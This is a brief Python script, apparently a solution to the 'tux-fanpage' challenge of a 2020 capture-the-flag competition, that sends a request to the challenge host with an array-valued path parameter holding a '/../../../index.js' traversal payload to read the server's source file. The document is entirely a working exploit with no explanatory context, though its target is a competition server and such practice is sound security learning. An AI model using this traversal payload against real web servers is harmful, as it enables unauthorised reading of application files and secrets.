import requests
payload = {'path': ['1','/','/../../../index.js']}
r = requests.get('https://tux-fanpage.2020.redpwnc.tf/page', params=payload)
print(r.url)
print(r.text)
